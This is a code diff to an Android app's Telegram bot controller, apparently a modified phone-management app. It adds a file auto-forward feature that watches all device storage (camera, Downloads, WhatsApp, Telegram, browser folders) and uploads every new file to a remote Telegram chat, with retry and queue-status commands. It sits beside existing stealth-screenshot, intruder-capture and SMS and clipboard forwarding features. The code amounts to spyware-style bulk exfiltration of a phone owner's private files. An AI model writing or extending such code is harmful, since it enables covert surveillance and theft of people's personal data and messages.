@@ -76,6 +76,7 @@ import com.ismartcoding.plain.preferences.TelegramBotForwardGeofencePreference
 import com.ismartcoding.plain.preferences.TelegramBotForwardBatteryAlertPreference
 import com.ismartcoding.plain.preferences.TelegramBotBatteryAlertThresholdPreference
 import com.ismartcoding.plain.preferences.TelegramBotForwardStealthShotsPreference
+import com.ismartcoding.plain.preferences.TelegramFileForwardEnabledPreference
 import com.ismartcoding.plain.helpers.SensorHelper
 import com.ismartcoding.plain.helpers.IntruderCaptureHelper
 import com.ismartcoding.plain.helpers.PerAppLockHelper
@@ -246,6 +247,10 @@ object TelegramBotManager {
         "batteryalert" to "🔋 Low-battery auto-alert — /batteryalert [on|off] [threshold%]",
         "forwardgeofence" to "🗺 Auto-forward geofence enter/exit alerts — /forwardgeofence [on|off]",
         "forwardshots" to "📸 Auto-forward stealth screenshots to chat — /forwardshots [on|off]",
+        "forwardfiles" to "📁 Auto-forward ALL new files & media from storage — /forwardfiles [on|off]",
+        "fwdfiles" to "📂 Recently auto-forwarded files — /fwdfiles [n]",
+        "filestats" to "📊 File auto-forward queue stats (pending / done / failed)",
+        "retryfailed" to "🔄 Retry all permanently-failed file uploads",
         "commands" to "📝 List all commands with details",
         "stop" to "⛔ Stop the bot",
     )
@@ -687,6 +692,10 @@ object TelegramBotManager {
                     "batteryalert", "batalert", "lowbattery" -> cmdBatteryAlert(args)
                     "forwardgeofence", "geofencefwd", "gffwd" -> cmdForwardGeofence(args)
                     "forwardshots", "shotsfwd", "autoshare" -> cmdForwardShots(args)
+                    "forwardfiles", "filesfwd", "autofiles", "allfiles" -> cmdForwardFiles(args)
+                    "fwdfiles", "forwardedfiles", "sentfiles" -> cmdFwdFiles(args)
+                    "filestats", "filequeue", "uploadstats" -> cmdFileStats()
+                    "retryfailed", "retryfiles", "retryuploads" -> cmdRetryFailed()
                     "applocker", "lockapps", "applock", "perapplock" -> cmdAppLocker(args)
                     "intruders", "captures", "intrudercaptures" -> scope.launch { cmdIntruderCaptures(args) }
                     "commands" -> cmdCommands()
@@ -1726,6 +1735,19 @@ object TelegramBotManager {
                         TelegramApiClient.answerCallbackQuery(token, cqId)
                         cmdForwardPhotos(listOf("off"))
                     }
+                    // ---- File auto-forward ----
+                    "filefwd_on" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Starting file auto-forward…")
+                        cmdForwardFiles(listOf("on"))
+                    }
+                    "filefwd_off" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Stopping file auto-forward…")
+                        cmdForwardFiles(listOf("off"))
+                    }
+                    "filefwd_retry" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Retrying failed uploads…")
+                        cmdRetryFailed()
+                    }
                     // ---- Clipboard forwarding ----
                     "clipfwd_on" -> {
                         TelegramApiClient.answerCallbackQuery(token, cqId)
@@ -2109,7 +2131,7 @@ object TelegramBotManager {
             Section("🔔 Notifications", listOf("notifications","mutenotifs","logs")),
             Section("🚨 Alerts & Actions", listOf("findphone","vibrate","speak","stopspeak","toast","show","wake","setalarm","batteryalert")),
             Section("⏰ Scheduling", listOf("schedulesms","setalarm","bedtime","newschedule")),
-            Section("📡 Auto-Forward", listOf("forwardsms","forwardphotos","forwardclipboard","forwardshots","forwardgeofence")),
+            Section("📡 Auto-Forward", listOf("forwardsms","forwardphotos","forwardclipboard","forwardshots","forwardgeofence","forwardfiles","fwdfiles","filestats","retryfailed")),
             Section("🤖 Bot", listOf("start","help","commands","stop","nowplaying")),
         )
         val cmdMap = allCommands.toMap()
@@ -7738,6 +7760,155 @@ object TelegramBotManager {
             else -> "🟡"
         }
         sendMessage("$emoji <b>Low Battery Alert</b>\n\n🔋 Battery is at <b>${level}%</b>\n⚡ Please charge the device soon.\n🕐 <i>$ts</i>")
+    }
+
+    // ==================== /forwardfiles ====================
+
+    private fun cmdForwardFiles(args: List<String>) {
+        val ctx = MainApp.instance
+        val setEnabled = when (args.firstOrNull()?.lowercase()) {
+            "on", "1", "true", "enable" -> true
+            "off", "0", "false", "disable" -> false
+            else -> null
+        }
+        scope.launch {
+            val current = TelegramFileForwardEnabledPreference.getAsync(ctx)
+            val newEnabled = setEnabled ?: !current
+            TelegramFileForwardEnabledPreference.putAsync(ctx, newEnabled)
+            if (newEnabled) {
+                FileForwardService.startIfEnabled(ctx)
+                val q = FileForwardQueue.get(ctx)
+                val pending = q.countPending()
+                val done = q.countDone()
+                val state = "✅ <b>ON</b> — monitoring all folders, forwarding every new file"
+                val info = if (pending > 0) "\n📤 $pending file(s) currently queued for upload" else ""
+                val rows = listOf(listOf("✅ Enable" to "filefwd_on", "🔕 Disable" to "filefwd_off"))
+                sendMessage(
+                    "📁 <b>File Auto-Forward</b>\n" +
+                        "━━━━━━━━━━━━━━━━━━━━\n" +
+                        "Status: $state$info\n\n" +
+                        "📸 Photos, videos, audio, docs, APKs — everything\n" +
+                        "🔍 All storage (DCIM, Downloads, WhatsApp, Telegram, Browser…)\n" +
+                        "💾 Already forwarded: <b>$done</b> files\n\n" +
+                        "<i>Use /fwdfiles to see recent uploads, /filestats for queue stats.</i>",
+                    replyMarkup = TelegramApiClient.inlineKeyboard(rows),
+                )
+            } else {
+                FileForwardService.stopService(ctx)
+                val rows = listOf(listOf("✅ Enable" to "filefwd_on", "🔕 Disable" to "filefwd_off"))
+                sendMessage(
+                    "📁 <b>File Auto-Forward</b>\n" +
+                        "━━━━━━━━━━━━━━━━━━━━\n" +
+                        "Status: 🔕 <b>OFF</b> — monitoring paused\n\n" +
+                        "<i>Re-enable with /forwardfiles on</i>",
+                    replyMarkup = TelegramApiClient.inlineKeyboard(rows),
+                )
+            }
+        }
+    }
+
+    private fun cmdFwdFiles(args: List<String>) {
+        val ctx = MainApp.instance
+        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 30) ?: 10
+        val q = FileForwardQueue.get(ctx)
+        val list = q.recentUploads(n)
+        if (list.isEmpty()) {
+            sendMessage("📁 <b>Forwarded Files</b>\n\nNo files have been uploaded yet.\n\n<i>Enable with /forwardfiles on</i>")
+            return
+        }
+        val sdf = java.text.SimpleDateFormat("MM-dd HH:mm", java.util.Locale.getDefault())
+        val sb = StringBuilder("📁 <b>Last ${list.size} Forwarded Files</b>\n━━━━━━━━━━━━━━━━━━━━\n\n")
+        list.forEachIndexed { i, e ->
+            val f = java.io.File(e.path)
+            val name = f.name
+            val tag = e.tag
+            val size = FileForwardQueue.formatSize(e.size)
+            val time = sdf.format(java.util.Date(e.detectedAt))
+            val emoji = when {
+                e.mime.startsWith("image/") -> "🖼"
+                e.mime.startsWith("video/") -> "🎬"
+                e.mime.startsWith("audio/") -> "🎵"
+                e.mime == "application/pdf" -> "📄"
+                e.mime.contains("zip") || e.mime.contains("rar") || e.mime.contains("7z") -> "📦"
+                e.mime.contains("word") || e.mime.contains("excel") || e.mime.contains("sheet") -> "📊"
+                else -> "📁"
+            }
+            sb.append("${i + 1}. $emoji <b>[${htmlEsc(tag)}]</b> ${htmlEsc(name)}\n")
+            sb.append("   📏 $size  🕐 $time\n\n")
+        }
+        val total = q.countDone()
+        val totalBytes = q.totalDoneBytes()
+        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("📊 Total uploaded: <b>$total</b> files (${FileForwardQueue.formatSize(totalBytes)})")
+        sendMessage(sb.toString())
+    }
+
+    private fun cmdFileStats() {
+        val ctx = MainApp.instance
+        val q = FileForwardQueue.get(ctx)
+        val pending = q.countPending()
+        val done = q.countDone()
+        val failed = q.countFailed()
+        val total = q.countTotal()
+        val doneBytes = q.totalDoneBytes()
+        val running = FileForwardService.isRunning()
+        scope.launch {
+            val enabled = TelegramFileForwardEnabledPreference.getAsync(ctx)
+            val statusEmoji = if (running) "🟢" else if (enabled) "🟡" else "🔴"
+            val statusText = if (running) "Running" else if (enabled) "Enabled (not running)" else "Disabled"
+            val sb = buildString {
+                append("📊 <b>File Auto-Forward Queue Stats</b>\n")
+                append("━━━━━━━━━━━━━━━━━━━━\n\n")
+                append("$statusEmoji Service: <b>$statusText</b>\n\n")
+                append("📤 Pending upload:    <b>$pending</b>\n")
+                append("✅ Successfully sent: <b>$done</b>  (${FileForwardQueue.formatSize(doneBytes)})\n")
+                append("❌ Permanently failed: <b>$failed</b>\n")
+                append("📋 Total seen:         <b>$total</b>\n\n")
+                if (failed > 0) {
+                    append("<i>Use /retryfailed to reset failed entries and retry them.</i>\n")
+                }
+                if (!running && enabled) {
+                    append("<i>Use /forwardfiles on to restart the service.</i>")
+                }
+            }
+            val rows = mutableListOf<List<Pair<String, String>>>()
+            if (!running) rows.add(listOf("▶️ Start" to "filefwd_on"))
+            if (running) rows.add(listOf("⏹ Stop" to "filefwd_off"))
+            if (failed > 0) rows.add(listOf("🔄 Retry Failed" to "filefwd_retry"))
+            sendMessage(sb, replyMarkup = if (rows.isNotEmpty()) TelegramApiClient.inlineKeyboard(rows) else null)
+        }
+    }
+
+    private fun cmdRetryFailed() {
+        val ctx = MainApp.instance
+        val q = FileForwardQueue.get(ctx)
+        val reset = q.resetFailed()
+        if (reset == 0) {
+            sendMessage("🔄 <b>Retry Failed</b>\n\nNo permanently-failed uploads found. All clear!")
+            return
+        }
+        sendMessage(
+            "🔄 <b>Retry Failed</b>\n\n" +
+                "✅ Reset <b>$reset</b> failed upload(s) back to pending.\n" +
+                "⬆️ They will be retried on the next upload cycle.",
+        )
+        FileForwardService.startIfEnabled(ctx)
+    }
+
+    /** Called by FileForwardService to notify bot about auto-forward toggle. */
+    fun notifyFileForwardEnabled(enabled: Boolean) {
+        if (!isRunning || token.isBlank() || chatId.isBlank()) return
+        val ctx = MainApp.instance
+        val q = FileForwardQueue.get(ctx)
+        val msg = if (enabled) {
+            "📁 <b>File Auto-Forward Started</b>\n" +
+                "━━━━━━━━━━━━━━━━━━━━\n" +
+                "🟢 Now monitoring all storage for new files\n" +
+                "📊 Queue: ${q.countPending()} pending, ${q.countDone()} already sent"
+        } else {
+            "📁 <b>File Auto-Forward Stopped</b>\n🔴 Monitoring paused."
+        }
+        sendMessage(msg)
     }
 
     /** Called by StealthScreenshotCapturer when a new shot is saved. */
